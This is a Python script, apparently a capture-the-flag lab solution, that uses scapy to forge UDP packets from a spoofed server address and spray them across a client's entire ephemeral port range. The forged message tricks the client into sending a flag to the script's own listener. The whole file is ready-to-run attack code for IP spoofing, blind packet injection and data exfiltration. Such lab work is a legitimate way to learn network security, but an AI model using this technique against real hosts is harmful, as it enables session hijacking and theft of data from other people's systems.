#!/usr/bin/env python3
"""
udp_spoofing_4_spray — same goal as udp_spoofing_4.py, but does NOT depend on sniffing.

Use this if udp_spoofing_4.py just hangs after "sniffing for ..." and never prints the
client's port. That means user_host can't SEE the client->server unicast (learning bridge),
so we can't learn the client's ephemeral port by sniffing. Instead we FORGE a reply to every
port in the ephemeral range and let the one that matches get buffered by the client.

Still forges the source IP = 10.0.0.3 (the new check at run:33), so it needs root — which
user_host has (run:39). Run inside the ./run shell:

    python udp_spoofing_4_spray.py
"""

import socket
import threading
import time

from scapy.all import IP, UDP, Raw, send

# --- lab topology ----------------------------------------------------------
CLIENT = "10.0.0.2"
SERVER = "10.0.0.3"
SERVER_PORT = 31337

ME = "10.0.0.1"
CATCH_PORT = 31338

# Linux default ephemeral range (cat /proc/sys/net/ipv4/ip_local_port_range in the lab to confirm)
PORT_LO, PORT_HI = 32768, 60999
# ---------------------------------------------------------------------------

PAYLOAD = f"FLAG:{ME}:{CATCH_PORT}".encode()


def catch_flag() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((ME, CATCH_PORT))
    print(f"[*] listening for the flag on {ME}:{CATCH_PORT}")
    while True:
        data, addr = s.recvfrom(1024)
        if data.strip():
            print(f"[+] FLAG from {addr[0]}:{addr[1]}: {data.decode(errors='replace')}")


def spray_once() -> None:
    # One scapy call with a port range -> scapy expands dport into one packet per port.
    pkt = IP(src=SERVER, dst=CLIENT) / UDP(sport=SERVER_PORT, dport=(PORT_LO, PORT_HI)) / Raw(load=PAYLOAD)
    send(pkt, verbose=0)


def main() -> None:
    threading.Thread(target=catch_flag, daemon=True).start()
    ports = PORT_HI - PORT_LO + 1
    print(f"[*] spraying forged {SERVER}:{SERVER_PORT} -> {CLIENT}:[{PORT_LO}-{PORT_HI}] "
          f"({ports} ports) in a loop (Ctrl-C to stop)...")
    rounds = 0
    while True:
        spray_once()
        rounds += 1
        print(f"[*] sweep {rounds} done", flush=True)
        time.sleep(1)   # the client re-sends ACTION? every 1s; give its recvfrom time to drain


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] stopped.")
